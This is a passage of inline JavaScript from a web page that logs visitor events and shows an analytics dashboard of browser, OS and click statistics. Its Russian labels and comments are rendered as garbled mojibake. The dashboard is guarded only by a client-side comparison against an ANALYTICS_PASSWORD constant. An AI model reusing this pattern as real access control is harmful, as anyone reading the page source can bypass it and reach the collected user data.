            const topBrowser = Object.keys(browsers).reduce((a, b) => browsers[a] > browsers[b] ? a : b, '');
            const topOS = Object.keys(os).reduce((a, b) => os[a] > os[b] ? a : b, '');

            statsContainer.innerHTML = `
                <div class="stat-card">
                    <div class="stat-number">${uniqueUsers}</div>
                    <div class="stat-label">–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${totalClicks}</div>
                    <div class="stat-label">–í—Å–µ–≥–æ —Å–æ–±—ã—Ç–∏–π</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${todayClicks}</div>
                    <div class="stat-label">–°–æ–±—ã—Ç–∏–π —Å–µ–≥–æ–¥–Ω—è</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${returningUsers}</div>
                    <div class="stat-label">–í–æ–∑–≤—Ä–∞—â–∞—é—â–∏—Ö—Å—è</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${apiUsers}</div>
                    <div class="stat-label">API –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${Math.round(totalClicks / (uniqueUsers || 1))}</div>
                    <div class="stat-label">–°—Ä. —Å–æ–±—ã—Ç–∏–π –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${topBrowser}</div>
                    <div class="stat-label">–ü–æ–ø—É–ª—è—Ä–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${topOS}</div>
                    <div class="stat-label">–ü–æ–ø—É–ª—è—Ä–Ω–∞—è –û–°</div>
                </div>
            `;
        }

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ —Å –∞–Ω–∏–º–∞—Ü–∏–µ–π
        function refreshAnalytics() {
            const refreshBtn = document.getElementById('refreshBtn');
            const icon = refreshBtn.querySelector('i');
            
            // –î–æ–±–∞–≤–ª—è–µ–º –∞–Ω–∏–º–∞—Ü–∏—é
            icon.classList.add('refreshing');
            refreshBtn.disabled = true;
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            showAnalytics();
            
            // –£–±–∏—Ä–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏—é —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É
            setTimeout(() => {
                icon.classList.remove('refreshing');
                refreshBtn.disabled = false;
            }, 1000);
        }

        // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –≤–∫–ª–∞–¥–æ–∫
        function switchTab(tabName) {
            // –£–±–∏—Ä–∞–µ–º –∞–∫—Ç–∏–≤–Ω—ã–π –∫–ª–∞—Å—Å —É –≤—Å–µ—Ö —Ç–∞–±–æ–≤ –∏ –∫–æ–Ω—Ç–µ–Ω—Ç–∞
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });

            // –î–æ–±–∞–≤–ª—è–µ–º –∞–∫—Ç–∏–≤–Ω—ã–π –∫–ª–∞—Å—Å –≤—ã–±—Ä–∞–Ω–Ω–æ–º—É —Ç–∞–±—É –∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É
            document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
            document.getElementById(`tab-${tabName}`).classList.add('active');
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', async function() {
            const userId = getUserId();
            
            // –≠–ª–µ–º–µ–Ω—Ç—ã
            const cancelBtn = document.getElementById('cancelBtn');
            const callBtn = document.getElementById('callBtn');
            const analyticsBtn = document.getElementById('analyticsBtn');
            const refreshBtn = document.getElementById('refreshBtn');
            const cancelModal = document.getElementById('cancelModal');
            const passwordModal = document.getElementById('passwordModal');
            const analyticsModal = document.getElementById('analyticsModal');
            const closeBtns = document.querySelectorAll('.close-btn');
            const passwordInput = document.getElementById('passwordInput');
            const submitPassword = document.getElementById('submitPassword');
            const passwordError = document.getElementById('passwordError');
            const tabs = document.querySelectorAll('.tab');

            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            await sendAnalytics('page_view', userId);

            // –û—Ç–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –æ—Ç–º–µ–Ω—ã
            cancelBtn.addEventListener('click', function() {
                sendAnalytics('cancel_button_click', userId);
                cancelModal.style.display = 'flex';
            });

            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∑–≤–æ–Ω–∫–∞
            callBtn.addEventListener('click', function() {
                sendAnalytics('call_button_click', userId);
            });

            // –û—Ç–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è
            analyticsBtn.addEventListener('click', function() {
                sendAnalytics('analytics_button_click', userId);
                passwordModal.style.display = 'flex';
                passwordInput.focus();
            });

            // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
            refreshBtn.addEventListener('click', refreshAnalytics);

            // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –≤–∫–ª–∞–¥–æ–∫
            tabs.forEach(tab => {
                tab.addEventListener('click', function() {
                    switchTab(this.dataset.tab);
                });
            });

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
            submitPassword.addEventListener('click', function() {
                if (passwordInput.value === ANALYTICS_PASSWORD) {
                    passwordModal.style.display = 'none';
                    analyticsModal.style.display = 'flex';
                    showAnalytics();
                    passwordInput.value = '';
                    passwordError.style.display = 'none';
                } else {
                    passwordError.style.display = 'block';
                    passwordInput.value = '';
                }
            });

            // –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ Enter –≤ –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    submitPassword.click();
                }
            });

            // –ó–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω—ã—Ö –æ–∫–æ–Ω
            closeBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    cancelModal.style.display = 'none';
                    passwordModal.style.display = 'none';
                    analyticsModal.style.display = 'none';
                    passwordError.style.display = 'none';
                    passwordInput.value = '';
                });
            });

            // –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ –∫–ª–∏–∫—É –≤–Ω–µ –æ–∫–Ω–∞
            window.addEventListener('click', function(event) {
                if (event.target === cancelModal) {
                    cancelModal.style.display = 'none';
                }
                if (event.target === passwordModal) {
                    passwordModal.style.display = 'none';
                    passwordError.style.display = 'none';
                    passwordInput.value = '';
                }
                if (event.target === analyticsModal) {
                    analyticsModal.style.display = 'none';
                }
            });

            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —É—Ö–æ–¥–∞ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            window.addEventListener('beforeunload', function() {
                sendAnalytics('page_leave', userId);
            });
        });
    </script>
</body>
</html>
